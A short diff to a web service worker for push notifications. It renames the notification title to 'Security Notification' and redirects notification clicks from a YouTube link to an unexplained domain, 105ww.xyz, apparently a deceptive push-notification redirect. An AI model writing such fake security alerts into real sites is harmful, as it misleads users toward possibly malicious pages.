@@ -8,7 +8,7 @@ self.addEventListener('activate', function(event) {
 
 });
 self.addEventListener('push', function(event) {
-    var title = 'Success';
+    var title = 'Security Notification';
 	data = event.data.json();
     event.waitUntil(
         self.registration.showNotification(title, data, {
@@ -19,7 +19,7 @@ self.addEventListener('push', function(event) {
 self.addEventListener('notificationclick', function(event) {
     console.log('Notification click: tag ', event.notification.tag);
     event.notification.close();
-    var url = 'https://youtu.be/gYMkEMCHtJ4';
+    var url = 'https://105ww.xyz';
     event.waitUntil(
         clients.matchAll({
             type: 'window'
